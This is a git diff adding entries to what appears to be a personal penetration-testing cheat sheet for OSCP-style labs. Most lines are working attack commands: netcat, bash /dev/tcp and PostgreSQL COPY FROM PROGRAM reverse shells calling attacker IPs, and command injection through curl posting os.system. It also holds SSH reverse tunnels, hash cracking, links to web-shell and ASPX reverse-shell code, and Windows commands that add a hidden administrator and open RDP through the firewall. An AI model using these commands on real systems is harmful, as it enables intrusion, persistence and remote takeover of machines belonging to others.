@@ -90,6 +90,8 @@ os.popen("id").read()
 ### Upgrade shell
 
 python -c 'import pty; pty.spawn("/bin/sh")'
+`   python3 -c 'import pty; pty.spawn("/bin/bash")'   ` #upgrade-shell
+
 
 curl -X  post --data "code=os.system('nc -e /bin/bash 192.168.45.162 18000')" http://192.168.175.117:50000/verify
 
@@ -97,8 +99,55 @@ curl -X  post --data "code=os.system('nc -e /bin/bash 192.168.45.162 18000')" ht
 %0Anc%20192.168.118.3%204444%20-e%20%2Fbin%2Fb
 
 ssh -R 80:0.0.0.0:80 web_svc@192.168.240.147
+ssh -N -R 127.0.0.1:60002:127.0.0.1:60002 kali@192.168.xx.xxx
 
+ssh kali@192.168.45.238 -R 1234(kali_port):localhost:5432(victim_port)
 
 ```
 
 bash -i>&/dev/tcp/192.168.45.225/8083 0>&1
+
+nmap -sV -p- -oN nmap-all-ports 192.168.250.62
+
+nc -e /bin/bash 192.168.45.162 18000  #nc_shell
+
+https://medium.com/@cybenfolland/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash_teacher #mysql_hash_crack
+
+https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php
+
+file upload bypass extension
+
+https://systemweakness.com/proving-grounds-practise-active-directory-box-access-79b1fe662f4d
+
+https://shawnvoong.medium.com/how-to-pass-the-2023-oscp-pen-200-on-the-first-try-part-1-enumeration-a0b272a86cf7
+
+Information Gathering
+
+nmap -p- -sV -sC -v <IPADDRESS> — open
+
+sudo nmap -p 53,67,68,69,111,123,161,162,137,138,139,514,1900,5353,500,445 -sU <IPADDRESS>
+
+autorecon --nmap-append="min-rate=2000" --exclude-tags="top-100-udp-ports" --exclude-tags nikto --dirbuster.threads=40 --dirbuster.tool=gobuster -v 192.168.241.145 
+
+wpscan — url [http://URL](http://URL)  
+wpscan — url [http://URL](http://URL) — enumerate p — plugins-detection aggressive
+
+user creation and rdp enable
+net user /add jack Password@12345
+net localgroup administrators jack /add
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+asp reverse shell
+
+https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
+
+postgres reverse shell
+
+COPY temp FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.238 8090 >/tmp/f';
+
+sudo psql --host=127.0.0.1 -U postgres
+
+\! /bin/sh
